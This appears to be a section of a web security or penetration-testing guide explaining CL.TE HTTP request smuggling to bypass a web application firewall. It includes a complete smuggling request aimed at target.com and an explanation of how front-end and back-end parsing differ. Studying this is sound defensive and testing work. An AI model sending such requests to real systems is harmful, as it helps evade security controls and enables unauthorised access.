### 9.5 HTTP Request Smuggling for WAF Bypass

**CL.TE smuggling to bypass WAF:**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

In this attack, the front-end (WAF) uses Content-Length and sees a 6-byte body "0\r\n\r\nG". The back-end uses Transfer-Encoding and sees the start of a new request "G" followed by the next request, potentially bypassing WAF inspection.

---



---
📖 本切片 2/2 结束。 本章节结束。